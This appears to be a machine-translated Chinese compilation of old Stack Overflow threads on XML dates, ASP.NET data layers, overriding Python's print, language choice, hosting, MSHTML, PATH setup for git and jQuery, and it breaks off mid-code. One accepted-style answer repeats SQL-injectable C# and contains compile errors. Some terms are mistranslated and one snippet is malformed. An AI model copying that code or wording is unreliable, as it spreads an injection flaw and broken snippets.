*   `brew install mingw-w64`

请在运行前保存您的代码。

有关参考，请参阅此[视频](https://www.youtube.com/watch?v=KhGnYWplLVo)

# xml - XML 中的日期元素

> ID：550467
> 
> 赞同：2
> 
> 时间：2009-02-15T07:25:25.407
> 
> 标签：xml, date

我想有两种主要的方法来表示 XML 中的日期：

```
<date>1984-10-27</date> 
```

和

```
<date>
  <year>1984</year>
  <month>10</month>
  <day>27</day>
</date> 
```

我个人会选择前者。它更紧凑，同时更具可读性。第二种形式的拆分对我来说似乎过分了；例如，在大多数情况下，月份本身没有任何信息价值。

您也不能独立验证像 <day> 这样的元素：您可以定义 [1..31] 的范围，但如果 <month> 为 2，则 31 是不可接受的。

另一方面，第一种形式可能会引起混淆，特别是如果您使用 (FFF) MM-DD-YYYY 或 DD-MM-YYYY。我总是使用 ISO 8601 格式 (YYYY-MM-DD)，因为它避免了这种混淆。

您更喜欢哪种 XML 代码？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-15T07:31:48.277

实践经验告诉我，最容易使用的日期值是 seconds-since-epoch。此值可跨所有语言移植，并且对时区不敏感（您的本地日期库将处理它）。

不管是好是坏，XML 往往更喜欢更冗长和人类可读的值。如果您想使用人类可读的日期值，我建议使用 ISO 8601 描述的标准时间格式：http: [//www.w3.org/TR/NOTE-datetime](http://www.w3.org/TR/NOTE-datetime)。这是一种明确且国际通用的格式。存在各种语言的解析器，它通常是日期值的最佳文本表示。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-15T10:21:37.467

xml 中日期/时间的标准比这更正式；大多数 xml 解析器都会尊重（例如）：

*   2009-02-15
*   2009-02-15T10:20:34.0000000
*   2009-02-15T10:20:34.0000000+00:00

这始终是 yyyy-MM-dd；时间部分是可选的，UTC 偏移量也是如此。

（编辑：[lucas-insasho](https://stackoverflow.com/questions/550467/date-elements-in-xml/550482#550482)正确引用了[规范](http://www.w3.org/TR/NOTE-datetime)）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-16T10:22:01.637

虽然我同意 lucas-insasho 的观点，即 seconds-since-epoch 通常是最容易使用的日期/时间表示，但它通常不是在 XML 中最容易使用的表示。XSLT 1.0 无法有效地处理它，也无法使用 XML Schema 对其进行验证。

当然，您可以随心所欲地用 XML 表示数据。但实际上，首先使用 XML（而不是更轻量级的序列化格式，如 JSON 或 YAML）的唯一原因是为了获得标准化必须提供的那些好处。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-15T10:16:32.627

我投票支持分手。你问的第一个有什么问题？

*   是那天/月还是月/日...错误可能是人为的，也可能是机器的
*   需要标记化以获取日期信息
*   您正在存储格式（分隔符）字符

# asp.net - 在 3 层实体类对象代码中需要帮助

> ID：550469
> 
> 赞同：0
> 
> 时间：2009-02-15T07:25:42.707
> 
> 标签：asp.net

我正在尝试访问实体类，但收到错误消息“CreateDoctor takse 3 参数没有重载方法”这是我的代码，请修改某人.. DoctorProperty 类：

```
public class DoctorProperty //class for doctor table
{
    int _Id;
    string _Name;
    string _Address;
    int _Phone;
    public int Id
    {
        get
        {
            return _Id;
        }
        set
        {
            _Id = value;
        }
    }
    public string Name
    {
        get
        {
            return _Name;
        }
        set
        {
            _Name = value;
        }
    }
    public string Address
    {
        get
        {
            return _Address;
        }
        set
        {
            _Address = value;
        }
    }
    public int Phone
    {
        get
        {
            return _Phone;
        }
        set
        {
            _Phone = value;
        }
    }
}
Doctor DataLayer:
public class DoctorDataLayer
{
    public string str = ConfigurationManager.ConnectionStrings["ConnectionString"].ToString();
    public int AddDoctor(DoctorProperty obj)
    {
        SqlConnection con = new SqlConnection(str);             
        SqlCommand com =new SqlCommand("insert into Doctor values('"+obj.Name+"','"+obj.Address+"','"+obj.Phone+"')",con);
        com.ExecuteNonQuery();
        return 0;    
    }
}
Doctor BusinessLayer:
public class DoctorBusinessLayer
{   
    public void CreateDoctor(DoctorProperty obj)
    {
        DoctorDataLayer dl = new DoctorDataLayer();
        dl.AddDoctor(obj);    
    }
}
AdDoctor.aspx.cs
protected void Btnsubmit_Click(object sender, EventArgs e)
    {
        DoctorBusinessLayer DB = new DoctorBusinessLayer();
        DoctorProperty dp = new DoctorProperty();
        DB.CreateDoctor(TxtName.Text, TxtAddress.Text, TxtPhone.Text);
    } 
```

上面突出显示的行出现错误：

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-15T09:49:45.827

更改此行：

```
DB.CreateDoctor(TxtName.Text, TxtAddress.Text, TxtPhone.Text); 
```

用这些 ：

```
dp.Name = TxtName.Text;
dp.Address = TxtAddress.Text;
dp.Phone = TxtPhone.Text;
DB.CreateDoctor(db); 
```

这是重新格式化的代码：

```
DoctorProperty class: public class DoctorProperty //class for doctor table 
{ 
int _Id; 
string _Name; 
string _Address; 
int _Phone; 

public int Id { get { return _Id; } set { _Id = value; } } 
public string Name { get { return _Name; } set { _Name = value; } } 
public string Address { get { return _Address; } set { _Address = value; } } 
public int Phone { get { return _Phone; } set { _Phone = value; } } 
} 

//Doctor DataLayer: 

public class DoctorDataLayer 
{ 
public string str = ConfigurationManager.ConnectionStrings["ConnectionString"].ToString(); 

public int AddDoctor(DoctorProperty obj) 
{ 
SqlConnection con = new SqlConnection(str);
SqlCommand com =new SqlCommand("insert into Doctor values('"+obj.Name+"','"+obj.Address+"','"+obj.Phone+"')",con); 
com.ExecuteNonQuery(); 
return 0;
} 
} 

//Doctor BusinessLayer: 

public class DoctorBusinessLayer {
public void CreateDoctor(DoctorProperty obj) 
{ 
DoctorDataLayer dl = new DoctorDataLayer(); 
dl.AddDoctor(obj);
} 
} 

//AdDoctor.aspx.cs 

protected void Btnsubmit_Click(object sender, EventArgs e) { 
DoctorBusinessLayer DB = new DoctorBusinessLayer(); 
DoctorProperty dp = new DoctorProperty(); 
dp.Name = TxtName.Text;
dp.Address = TxtAddress.Text;
dp.Phone = TxtPhone.Text;
DB.CreateDoctor(db); 
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T07:36:38.310

您的 CreateDoctor 方法只需要 1 个参数。

```
public void CreateDoctor(DoctorProperty) 
```

但是你用 3 个参数来调用它......

```
DB.CreateDoctor(string, string, string) 
```

您可以通过一种方式解决问题...

编辑：仔细查看您的代码，似乎它会从重写中受益，所以这里是：

```
public class Doctor
{
  // JohannesH: Changed to use auto properties instead.
  public int Id { get; set; }
  public string Name { get; set; }
  public string Address { get; set; }
  public string Phone { get; set; }
}

public static class DoctorDataLayer
{
  public static void AddDoctor(Doctor doctor) // JohannesH: Changed return type from int to void.
  {
    string connectionString = ConfigurationManager.ConnectionStrings["ConnectionString"].ConnectionString; // JohannesH: Changed from .ToString() to .ConnectionString

    // JohannesH: Changed to use "using" to make sure everything gets disposed correctly during failure.
    using(var connection = new SqlConnection(connectionString))
    {
      using (var command = new  SqlCommand("insert into doctor values(@name,@address,@phone)", connection))
      {
        // JohannesH: Now using SqlParameters to get rid of sql injection attacks.
        command.Parameters.AddWithValue("@name", doctor.Name);
        command.Parameters.AddWithValue("@address", doctor.Address);
        command.Parameters.AddWithValue("@phone", doctor.Phone);

        connection.Open();
        command.ExecuteNonQuery();
        connection.Close();
      }
    }
  }
}

public static class DoctorBusinessLayer
{
  public static void CreateDoctor(string name, string address, string phone) 
  {
    DoctorDataLayer.AddDoctor(new Doctor {Name = name, Address = address, Phone = phone});
  }
} 
```

# python - 重载打印python

> ID：550470
> 
> 赞同：57
> 
> 时间：2009-02-15T07:26:05.480
> 
> 标签：python, printing, overloading

我可以重载`print`函数并从内部调用正常函数吗？我想要做的是在我想`print`调用 my的特定行之后`print`，它将调用正常`print`并将副本写入文件。

我也不知道如何超载`print`。我不知道如何做可变长度参数。我很快就会查到它，但 [重载打印 python](https://stackoverflow.com/questions/550470/overload-print-python/550477#550477)刚刚告诉我我不能`print`在*2.x*中重载，这是我正在使用的。

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2012-04-11T13:06:25.397

对于那些查看以前日期的答案的人来说，从版本发布“Python 2.6”开始，对原始发布者的问题有一个新的答案。

在 Python 2.6 及更高版本中，您可以禁用打印语句以支持打印功能，然后使用您自己的打印功能覆盖打印功能：

```
from __future__ import print_function
# This must be the first statement before other statements.
# You may only put a quoted or triple quoted string, 
# Python comments, other future statements, or blank lines before the __future__ line.

try:
    import __builtin__
except ImportError:
    # Python 3
    import builtins as __builtin__

def print(*args, **kwargs):
    """My custom print() function."""
    # Adding new arguments to the print function signature 
    # is probably a bad idea.
    # Instead consider testing if custom argument keywords
    # are present in kwargs
    __builtin__.print('My overridden print() function!')
    return __builtin__.print(*args, **kwargs) 
```

当然，此时您需要考虑到此打印功能仅适用于模块范围。您可以选择覆盖`__builtin__.print`，但您需要保存原始文件`__builtin__.print`；可能与`__builtin__`命名空间混淆。

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2009-02-15T07:37:01.167

重载`print`是 python 3.0 的一个设计特性，用于解决你在 python 2.x 中缺乏这样做的能力。

但是，您可以覆盖 sys.stdout。（[示例](http://code.activestate.com/recipes/119404/)。）只需将其分配给另一个类似文件的对象即可。

或者，您可以通过 unix`tee`命令通过管道传输您的脚本。`python yourscript.py | tee output.txt`将打印到 stdout 和 output.txt，但这将捕获所有输出。

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2013-03-23T17:45:25.543

```
class MovieDesc:
    name = "Name"
    genders = "Genders"
    country = "Country"

 def __str__(self):
#Do whatever you want here
        return "Name: {0}\tGenders: {1} Country: {2} ".format(self.name,self.genders,self.country)

) 
```

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2009-03-27T07:22:31.543

我遇到了同样的问题。

这个怎么样：

```
class writer :
    def __init__(self, *writers) :
        self.writers = writers

    def write(self, text) :
        for w in self.writers :
            w.write(text)

import sys

saved = sys.stdout
fout = file('out.log', 'w')
sys.stdout = writer(sys.stdout, fout)
print "There you go."
sys.stdout = saved
fout.close() 
```

它对我来说就像一个魅力。它取自[http://mail.python.org/pipermail/python-list/2003-February/188788.html](http://mail.python.org/pipermail/python-list/2003-February/188788.html)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-02-15T08:53:28.520

尽管您不能替换`print`关键字（在 Python 2.x`print`中是关键字），但通常的做法是替换`sys.stdout`以执行类似于`print`覆盖的操作；例如，使用`StringIO.StringIO`. 这将捕获`StringIO`实例中的所有打印数据，之后您可以对其进行操作。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-02-15T07:29:39.997

在 Python 2.x 中你不能，因为 print 不是一个函数，它是一个语句。在 Python 3 中 print 是一个函数，所以我想它可以被覆盖（虽然没有尝试过）。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2014-02-22T19:05:39.687

只是想我会添加我的想法......适合我能够在 Eclipse 中运行 sthg 然后从（Windows）CLI 运行而不会在每个打印语句中出现编码异常的目的。无论您做什么，都不要使 EncodingStdout 成为类文件的子类：“self.encoding = encoding”行将导致编码属性为无！

注意，我在一天中与这些东西搏斗时发现的一件事是，在“打印”或“写入”之前引发了编码异常：这是在参数化字符串（即“mondodod %s blah blah %s”% ( "blip", "blap" )) 是由……什么？“框架”？

```
class EncodingStdout( object ):
    def __init__( self, encoding='utf-8' ):
        self.encoding = encoding

    def write_ln( self, *args ):
        if len( args ) < 2:
            sys.__stdout__.write( args[ 0 ] + '\n' )
        else:
            if not isinstance( args[ 0 ], basestring ):
                raise Exception( "first arg was %s, type %s" % ( args[ 0 ], type( args[ 0 ]) ))
            # if the default encoding is UTF-8 don't bother with encoding
            if sys.getdefaultencoding() != 'utf-8':
                encoded_args = [ args[ 0 ] ]
                for i in range( 1, len( args )):
                    # numbers (for example) do not have an attribute "encode"
                    if hasattr( args[ i ], 'encode' ):
                        encoded_args.append( args[ i ].encode( self.encoding, 'replace' ) )
                    else:
                        encoded_args.append( args[ i ])
                args = encoded_args
            sys.__stdout__.write( args[ 0 ] % tuple( args[ 1 : ] ) + '\n' )
        # write seems to need a flush
        sys.__stdout__.flush()

    def __getattr__( self, name ):
        return sys.__stdout__.__getattribute__( name )

print "=== A mondodod %s %s" % ( "été", "pluviôse, irritée contre la ville entière" ) 

sys.stdout = EncodingStdout()
sys.stdout.write_ln( "=== B mondodod %s %s", "été", "pluviôse, irritée contre la ville entière" )

# convenience method
def pr( *args ):
    sys.stdout.write_ln( *args )

pr( "=== C mondodod %s %s", "été", "pluviôse, irritée contre la ville entière" ) 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-11-30T08:51:41.753

[我在不同的 SO 问题上](https://stackoverflow.com/questions/770657/python-overridding-print/1818572#1818572)回答了相同的问题

本质上，最简单的解决方案是将输出重定向到 stderr，如下所示，在 wsgi 配置文件中。

```
sys.stdout = sys.stderr 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2016-04-04T15:53:01.900

对于一个非常简单的示例，从 Python3.4 开始（尚未使用旧版本进行测试），这对我来说效果很好（放置在模块的顶部）：

```
import time
def dprint(string):
  __builtins__.print("%f -- %s" % (time.time(), string))

print = dprint 
```

请注意，这仅适用于字符串参数是 str... YMMV

# python - 学习 Objective-C、Ruby 还是 Python？

> ID：550474
> 
> 赞同：7
> 
> 时间：2009-02-15T07:28:15.757
> 
> 标签：python, objective-c, ruby, programming-languages

自过去 4-5 年以来，我一直在研究 C++。最近我买了iphone和macbook，想为iphone做一些编程。

所以我开始阅读一本关于 Objective-C 的书。我还了解到我们可以在 MAC 上使用 Ruby 和 Python 进行编程。

所以我的问题是学习哪一个？你们看到的未来是哪种语言？？？

我们可以在其他平台上使用这些语言进行编程吗？还是这些仅限于MAC？

我只是 Objective-C 的初学者。需要一些专家的想法。

交流电

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-02-15T07:43:22.090

如果你想为 iphone 编程，那么你应该使用 Objective-C。整个 iphone API 都是基于 Objective-C 的，您可以从 Xcode 中使用界面生成器和 IDE 支持。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-15T14:03:27.853

我使用所有语言 C++、Ruby、Python 和 Objective-C。我以不同的方式喜欢每一个。如果你想像其他人一样进入 Mac 和 iPhone 开发，我推荐 Objective-C。

未提及的其中一个好处是，Objective-C 是 C 的适当超集（C++ 几乎是超集），这意味着您可以将所有 C 编程知识从 C++ 带到 Objective-C 编程。事实上，你也可以在 Objective-C 代码中混入 C++ 代码。

你不能在 Python 和 Ruby 中以无缝的方式做到这一点。之所以可以这样做，是因为 Objective-C 实际上是一门非常简单的语言。

最初它只是带有定制预处理器的 C，它采用如下语句：

```
[rectangle setX: 10 y: 10 width: 20 height: 20]; 
```

并在编译之前将其转换为：

```
 objc_msgSend(rectangle, "setX:y:width:height:", 10, 10, 20, 20); 
```

除此之外，至少与 C++ 相比，Ruby、Python 和 Objective-C 的对象模型非常相似。在 C++ 中，类是在编译时创建的。在 Objective-C 中，Ruby 和 Python 类是在运行时创建的。

我在这里写了一些关于[为什么 Obj-C 很酷的东西](http://loadcode.blogspot.com/2007/09/why-objective-c-is-cool.html)

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-02-15T08:10:21.527

如果您想生成可以在 App Store 中出售的本机程序，Objective-C 是对 iPhone 进行编程的唯一方法。

Objective-C 中的一些更高级的概念现在被添加到 C# 等语言中（例如：C# v3.0 中的扩展方法）。学习用 Objective-C 思考会很有用，你学习的 OO 模型将适用于大多数其他语言和环境，作为你 C++ 经验的补充。

与 Python 相比，Ruby 的对象模型更接近于 Objective-C，所以我建议也学习 Ruby，但在你扎实掌握 Objective-C 技能之前不要学习。

请注意，您可以通过在文件上添加 .mm 后缀来使用 Objective-C++ 并将 C++ 用于除 GUI 代码之外的所有代码 - 这适用于 iPhone 和 Mac。鉴于您的 C++ 经验，这有助于您提高工作效率。

如果您想对 iPhone 进行编程，不必费心学习新的 Objective-C 2.0 内存管理，但您仍然可以使用 Properties 模型（iPhone 实际上具有 Objective-C 2.0 运行时的子集）。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2009-02-15T12:51:03.753

**你们看到的未来是哪种语言？？？**

未来是什么？iPhone 开发？目标-C。

网页服务？Python/Ruby 并行了一段时间。至少在人们开始尝试对大型 Rub​​y 应用程序进行维护并对它的不透明性感到沮丧之前。

实时游戏引擎开发？嵌入式应用程序？未来是什么？

**“我们可以在其他平台上使用这些语言进行编程吗？或者这些语言是否仅限于 MAC？”**

Ruby 和 Python：是的。这些设计用于在任何支持 C 的平台上运行。

目标-C：是的。它是开源的，它在 GCC 中，几乎可以在任何地方工作 *。*

学习一门新语言**不是**零和游戏。你可以学习不止一种语言；现在学习 Objective-C 并不妨碍你以后学习 Python 或 Ruby。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-02-15T07:36:06.127

作为 Perlite，我只想指出 OS X 有 Perl 以及 Python 或 Ruby。

就 Perl/Python/Ruby 而言，程序几乎是完全跨平台的。在任何平台上运行 Perl/Python/Ruby 程序都相当容易，而且工作方式或多或少是相同的。可能有一些细微的差异，但它们不是主要的。

Objective-C，虽然不严格限制在 OS X 中，但仅真正用于基于 OpenStep 的环境中，通常是指 OS X 和 iPhone。我知道的唯一Objective-C编译器是gcc，我想你可以在Linux上编写Objective-C，但我不知道Windows支持是否很好（如果存在的话）。

至于哪一种是“未来”的语言，未来所有3（或4）种语言都会被非常广泛地使用。没有人能真正预测到这种事情，而且没有一种语言真的会消亡（除非 Apple 切换到一种新语言作为制作 Mac 程序的“标准”），所以你可以很安全地使用任何一种他们。

我的建议：全部尝试一下，看看你认为哪一个最适合你的风格，然后学习那个。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-02-15T09:20:57.080

正如其他人所指出的，如果您想对 iPhone 进行编程，Objective-C 是您的最佳选择。

Objective-C 是 Mac 特有的。当然，Gnu Objective-C 编译器也适用于其他平台，还有[GnuStep](http://www.gnu.org/software/gnustep/)，但我认为 Objective-C 今天主要适用于 Mac 和 iPhone 的编程。

另一方面，Python 和 Ruby 可在大量平台上使用（包括 Windows 和许多 Unix 方言）。就个人而言，我更喜欢 Python，但我想说这两种语言都非常好用并且很容易使用。

另请注意，[Python](http://pyobjc.sourceforge.net/)和[Ruby](http://rubycocoa.sourceforge.net/HomePage)都具有可用的 Objective-C 桥接器，这使您可以使用其中任何一种语言编写相当精美的 Cococa 应用程序。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-02-15T07:49:52.293

如果您使用 Objective-C 进行编程，您的主要目标应该是在 Mac 上编写 Cocoa 应用程序。除此之外，它几乎没有用处。Ruby 和 Python 是有用的脚本语言，也有编写 Cocoa 应用程序的桥梁。

如果你想在 Mac 上编写应用程序，我会从 Objective-C 开始。有更多支持可用。

就未来而言，目前似乎很多人都在追赶 Ruby 的潮流。祝你好运。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-02-15T08:44:20.163

要在 Mac OS X 上编程，您确实需要良好的 Objective-C 基础。绝大多数文档将假定 Objective-C。即使您选择用其他语言编写某些应用程序，最好对它有一个很好的理解。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2009-02-15T14:50:10.113

红宝石。使用 Ruby，您将能够进行 Web 开发（Rails/Sinatra/etc.），并且很快就可以使用 Macruby 项目在 MAC/Iphone 平台上进行编程。为什么不两全其美？

汤米

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2009-02-16T07:49:10.460

只是我的两分钱...我相信您知道，Apple 和各自社区的其他人正在使用 Ruby 和 Python 进行大量工作，用于 Mac 和 iPhone 开发。Objective-C 几乎只会让你进入 Apple 的领域（尽管这可能不是一件坏事；）但是，如果你在可预见的将来只学习一种语言，请考虑一下你将在哪里使用它，并且做什么的。如果你的目光不仅仅局限于 Mac 桌面和 iPhone，那么 Ruby 和 Python 会让你走得更远。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2009-08-25T21:08:17.280

我用 Ruby 编写了小游戏、解释器和大量很棒的东西。例如，我不建议用它来编写密集的 AI 程序，但它对大多数应用程序来说学习起来很有趣并且功能强大。即使我在 C++ 中完成大部分工作，出于主观原因，Ruby 也是我最喜欢的语言。

正如大多数人所说，Objective C 是 iPhone 开发中的必备品，如果你对学习语言充满热情，它会很有趣。

我没有尝试过 Python，但我只听到关于它的好消息，而且 PyGames 很受欢迎。

我会学习这三个（嗯...我会跳过目标 C，除非你对进入 iPhone 开发感到好奇），你知道的最多的语言，你会是最专业的。正如我的一位好教授总是说的那样..这不仅仅是掌握一种语言，而是要了解每种语言的优缺点，然后根据您要解决的特定问题选择合适的语言。

干杯！

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2009-02-15T13:29:23.397

Objective-C 仅适用于 Mac/iPhone，如果您想开发 Mac/iPhone 应用程序，我建议您学习。Python 就是一切，它是未来，但 Python 更适合 Web 开发。Python 是 Google :) Python 是网络、游戏、科学、图形、桌面等。如果你是 C/C++ 开发人员，它也是一个很好的选择。

不知道我是否可以推荐你学习 Ruby ......

# asp.net-mvc - 有人使用 GoDaddy Grid Hosting 和 ASP.NET MVC 吗？

> ID：550478
> 
> 赞同：5
> 
> 时间：2009-02-15T07:30:17.127
> 
> 标签：asp.net-mvc, hosting, cloud

我最近发布了基于 ASP.NET MVC 的网站。我开始计划何时需要升级主机。我想搬到云计算提供商，我看到 GoDaddy 有一个处于测试阶段的网格托管解决方案。

有人尝试将 ASP.NET MVC Web 应用程序部署到 GoDaddy 网格托管吗？如果有，体验如何？根据他们的帮助文档，它似乎比其他云托管提供商更容易使用。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2010-08-05T05:27:15.690

我的网站在 GoDaddy Grid (Windows/Unlimited) 上运行，我正在使用 MVC。一切似乎都运行良好，尽管我并没有真正注意到标准共享主机的可靠性有所提高。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-17T08:28:30.483

我看过很多关于 Godaddy 网格托管的差评，所以我个人没有尝试过。

如果您对网格托管感兴趣，您应该考虑使用[Microsoft Azure 平台](http://www.microsoft.com/azure/default.mspx)。

人们一直在 Azure 上使用 ASP.NET MVC：[http ://www.aaronlerch.com/blog/2008/11/01/run-aspnet-mvc-on-windows-azure/](http://www.aaronlerch.com/blog/2008/11/01/run-aspnet-mvc-on-windows-azure/)

# vb.net - 如何在 VB.NET 中使用 MSHTML？

> ID：550479
> 
> 赞同：5
> 
> 时间：2009-02-15T07:30:47.310
> 
> 标签：vb.net, mshtml

在对问题 # [56107](https://stackoverflow.com/questions/56107/what-is-the-best-way-to-parse-html-in-c)的回答中，Erlend 提供了这个示例 C# 代码：

```
using mshtml;
...
object[] oPageText = { html };
HTMLDocument doc = new HTMLDocumentClass();
IHTMLDocument2 doc2 = (IHTMLDocument2)doc;
doc2.write(oPageText); 
```

我想在 VB.NET 中使用 mshtml，但 IDE 无法识别：

```
Imports mshtml 
```

在 VB.NET 中使用 MSHTML 需要采取哪些额外步骤？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-02-15T07:41:55.137

找到了我自己的问题的答案：

[ASP.NET 中的 MSHTML](http://web.archive.org/web/20081006160223/http://radio.javaranch.com/balajidl/2006/01/18/1137606354980.html)

> 如果您有兴趣，这里是基于 VB.NET 的解决方案，您可以将其与 ASP.NET(.aspx.vb) 一起使用。确保从 .NET 对象集合和“Imports System.Runtime.InteropServices”中添加对 Microsoft.mshtml 的引用

有了这个线索，我通过打开“添加引用”对话框并查看 COM 选项卡而不是 .NET 选项卡找到了这一点。它的组件名称是 Microsoft HTML 对象库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-02-09T18:16:06.083

导入 System.Runtime.InteropServices 和

“有了这个线索，我通过打开“添加引用”对话框（项目==>添加引用）并查看 COM 选项卡而不是 .NET 选项卡找到了这一点。它的组件名称是 Microsoft HTML 对象库。

它工作 100%

# c - 通过 IP 地址控制设备有哪些方法？

> ID：550486
> 
> 赞同：2
> 
> 时间：2009-02-15T07:36:06.177
> 
> 标签：c, networking, rest, soa, messaging

我想了解如何通过 IP 地址控制摄像机。我有一个 API 可以从本地机器控制平移和倾斜。代码将在 Windows 上使用 C/C++。如果我想从一个应用程序控制多个摄像头或将一个摄像头用于一个应用程序，我仍在设计。SOA 会是一个有用的架构来构建我的消息传递吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T08:05:12.410

[我认为像REST](http://en.wikipedia.org/wiki/REST)这样的任务可以很好地为您服务。对 REST 服务器执行命令非常直观和简单，听起来就像您需要的一样。我可能会制作某种在 Web 服务器内运行的应用程序，因为这将处理大部分基础设施，包括必要时的身份验证。我确信 apache 和 IIS 都可以很容易地为您做到这一点。即使您的 API 是用 C 编码的，您也可以考虑使用一些更高级别的脚本语言作为 API 的客户端（在 Web 服务器内部）。

对于这样的任务，SOA 听起来有点矫枉过正。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T08:05:01.477

我在大学的一个项目中做了类似的事情。我们所拥有的是连接到 LAN 的摄像机，并且通过消息传递很容易与它们进行通信，与与任何 PC 通信相同。我们有相同的应用程序来传达它们。您可以使用 SOA 或任何您认为方便的架构，这取决于您的应用程序。

因为我们的案例只是一个临时架构，它并不是一件复杂的事情。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-16T06:46:16.820

黑森不错。它基本上是 REST，但有一个比 XML 更有效的二进制协议，它还可以让您很容易地从其他语言进行调用。因此，您可以在 C# 中开发客户端 GUI 应用程序，并在 C 中开发服务器。有几种不同语言的免费库可用。

[http://hessian.caucho.com/](http://hessian.caucho.com/)

# git - 如何将 $HOME/opt/git/bin 放到我的 PATH 中？

> ID：550490
> 
> 赞同：14
> 
> 时间：2009-02-15T07:40:52.487
> 
> 标签：git, bash, unix, path

我尝试将以下内容包含在我的 ~/.profile 中，但未成功：

```
export PATH='$HOME/opt/git/bin' 
```

它似乎不起作用，因为 $git 什么也没给我。我正在尝试安装 Git。

我也在[这里](https://stackoverflow.com/questions/315911/git-for-beginners-the-definitive-practical-guide/323764#323764)尝试过命令。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-02-15T07:54:08.383

您需要小心使用该命令。它将**覆盖**您的 $PATH。

您可能需要将其放入并将其`~/.bash_profile`更改为：

```
export PATH="$HOME/opt/git/bin:$PATH" 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-15T08:12:25.843

正如 SirLancelot 指出的那样，您重置路径而不是增加路径。您还使用了单引号而不是双引号，因此设置的值正是显示的字符串，而不是包含 $HOME 的扩展值。如前所述，正确的解决方案是使用：

```
export PATH="$PATH:$HOME/opt/git/bin" 
```

或者您可以颠倒顺序：

```
export PATH="$HOME/opt/git/bin:$PATH" 
```

但是，所做的只是确保当您键入 时`git`，将找到可执行文件。

您的问题还提到使用`$git`; 您必须设置该变量，也许使用：

```
export git=$(which git) 
```

话虽如此，我看不出使用`$git`when `git`is on your PATH 有什么好处。它是一个额外的字符（也是一个移位的数字）。如果你想继续使用`$git`，你可能不应该添加`$HOME/opt/git/bin`到 PATH. 它的存在会减慢不成功的命令搜索，如果您总是`git`通过`$git`（现在必须使用 : 设置）访问，那么在您的 PATH 上`export git=$HOME/opt/git/bin/git`拥有 bin 目录没有任何好处。`git`

* * *

Masi 评论说订单毫无意义，Douglas Leeder 回应道：

> 顺序不是毫无意义的——它是搜索[目录]的顺序。但是，`git`不在您的任何其他搜索目录中，并且 bin 目录中的命令与任何其他目录中的命令之间不应有任何重叠`git`，因此在这种情况下顺序不会有任何区别。

这基本上是准确的，但我会稍微旋转一下。搜索命令时，系统会通过在 PATH 中的每个目录中查找该程序来查找该程序，直到找到为止。因此，`ls`例如，当它查找`git`PATH 前面的 bin 目录时，shell 将查找`$HOME/opt/git/bin/ls`但未找到它，然后转到 PATH 中的其他目录，最终在`/usr/bin/ls`or中找到它`/bin/ls`。一些 shell 缓存找到程序的位置；其他的没有。`/bin`因此，保持和靠近 PATH 的前面是有意义`/usr/bin`的，以加快对标准实用程序的访问。我总是保持`$HOME/bin`在我的 PATH 的前面；这样，我可以用我自己的版本覆盖任何东西——我对一些命令这样做。

此外，在我的主要工作机器上，该`/usr/local/bin`目录不在我的控制之下。因此，我不信任它，并且我确保它在我的 PATH 末尾是正确的，因此其中的古董 GCC 不是我使用的那个，例如。[*嗯; 他们已将其更新到 3.4.6；它曾经是 2.95 左右；不过，我使用 4.3.3。*]

再给你一个建议。`$HOME/bin`考虑在你的（假设你有一个并且它在你的 PATH 上）中创建一个指向安装位置的符号链接`git`。这意味着您不会向 PATH 添加额外的目录（因此工作速度会稍微快一些），但您可以使用`git`您选择使用的版本。

```
ln -s $HOME/opt/git/bin/git $HOME/bin/git 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T07:53:08.120

你需要删除''，试试这个

```
export PATH=$HOME/opt/git/bin 
```

并且不要覆盖你的整个路径试试这个：

```
export PATH=$PATH:$HOME/opt/git/bin 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T07:48:12.250

这应该有效。

$HOME 指向哪里？

确保 $HOME/opt/git/bin 实际上包含一个名为 git 的可执行文件。

# php - 开始 jQuery 帮助

> ID：550494
> 
> 赞同：0
> 
> 时间：2009-02-15T07:41:59.720
> 
> 标签：php, javascript, jquery, mysql

我正在尝试用 php 和 jQuery 制作一个简单的 MySQL Admin。我从未使用过 jQuery，所以我的代码可能非常值得大笑。我遇到的代码问题是，当我单击按钮时，什么也没有发生。我知道偶数会触发，因为如果我在 firefox 中打开 html 文件（不转到 url，使用 file:/// 东西）并单击它，它会在我希望返回的内容进入的框中显示我的 php 代码. 我要做的第一件事是连接到指定的数据库并返回表列表。这是我的代码

**索引.html**

```
<html>
    <head>
        <script type='text/javascript' src='jquery.js'></script>

        <script type='text/javascript'>
            var Server = 'None';
            var Username = 'None';
